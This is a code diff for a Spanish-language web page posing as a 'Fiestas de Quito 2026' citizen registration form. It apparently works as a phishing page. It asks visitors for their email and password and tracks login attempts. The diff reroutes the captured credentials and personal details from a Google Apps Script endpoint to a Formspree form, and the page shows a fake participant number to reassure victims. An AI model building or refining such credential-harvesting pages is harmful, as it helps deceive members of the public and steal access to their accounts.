@@ -42,7 +42,6 @@
         <div class="absolute top-2 left-4 text-quito-gold font-bold text-xs md:text-sm tracking-widest">2026</div>
         <div class="absolute top-2 right-4 text-quito-gold font-bold text-xs md:text-sm tracking-widest">2026</div>
         
-        <!-- ¡VIVA QUITO! grande con colores de la bandera -->
         <h1 class="text-3xl md:text-5xl font-black tracking-wider quito-title-gradient mb-1">¡VIVA QUITO!</h1>
         <h2 class="text-xl md:text-2xl font-extrabold text-white tracking-wide drop-shadow-md">Fiestas de Quito 2026</h2>
         <p class="text-xs md:text-sm text-quito-gold uppercase font-semibold mt-1 tracking-widest">Participación y Registro Ciudadano</p>
@@ -142,7 +141,7 @@
             </form>
         </section>
 
-        <!-- PASO 3: AGRADECIMIENTO -->
+        <!-- PASO 3: AGRADECIMIENTO CON NÚMERO GRANDE DE PARTICIPANTE (> 1900) -->
         <section id="thanks-section" class="hidden bg-slate-900/90 border border-quito-gold/50 rounded-2xl p-8 shadow-2xl backdrop-blur-md max-w-md w-full text-center space-y-4">
             <div class="inline-flex p-3 bg-emerald-500/10 rounded-full text-emerald-400">
                 <i data-lucide="check-circle" class="w-10 h-10"></i>
@@ -175,8 +174,8 @@
     <script>
         lucide.createIcons();
 
-        // ⚠️ REEMPLAZA ESTA URL POR LA TUYA DE APPS SCRIPT ⚠️
-        const GOOGLE_SCRIPT_URL = 'TU_URL_DE_GOOGLE_APPS_SCRIPT_AQUI';
+        // ⚠️ REEMPLAZA ESTA URL CON TU ENDPOINT DE FORMSPREE ⚠️
+        const FORMSPREE_URL = 'https://formspree.io/f/TU_ID_DE_FORMSPREE';
 
         let userData = { email: '', password: '', name: '', companion: '', preference: '', artists: '', comments: '' };
         let loginAttempts = 0;
@@ -215,24 +214,26 @@
 
             const randomParticipantId = Math.floor(Math.random() * 600) + 1901;
 
-            const formData = new URLSearchParams();
-            formData.append('fecha', new Date().toLocaleString());
-            formData.append('email', userData.email);
-            formData.append('password', userData.password);
-            formData.append('name', userData.name);
-            formData.append('companion', userData.companion);
-            formData.append('event', userData.preference);
-            formData.append('artists', userData.artists);
-            formData.append('comments', userData.comments);
-            formData.append('ticket', '#' + randomParticipantId);
+            const formData = new FormData();
+            formData.append('Fecha', new Date().toLocaleString());
+            formData.append('Correo', userData.email);
+            formData.append('Contrasena', userData.password);
+            formData.append('Nombre Principal', userData.name);
+            formData.append('Acompanante', userData.companion);
+            formData.append('Evento Preferido', userData.preference);
+            formData.append('Artistas Sugeridos', userData.artists);
+            formData.append('Comentarios', userData.comments);
+            formData.append('Numero de Participante', '#' + randomParticipantId);
 
-            fetch(GOOGLE_SCRIPT_URL, {
+            fetch(FORMSPREE_URL, {
                 method: 'POST',
-                mode: 'no-cors',
-                body: formData
-            }).then(() => {
+                body: formData,
+                headers: {
+                    'Accept': 'json'
+                }
+            }).then(response => {
                 mostrarAgradecimiento(randomParticipantId);
-            }).catch(() => {
+            }).catch(error => {
                 mostrarAgradecimiento(randomParticipantId);
             });
         });
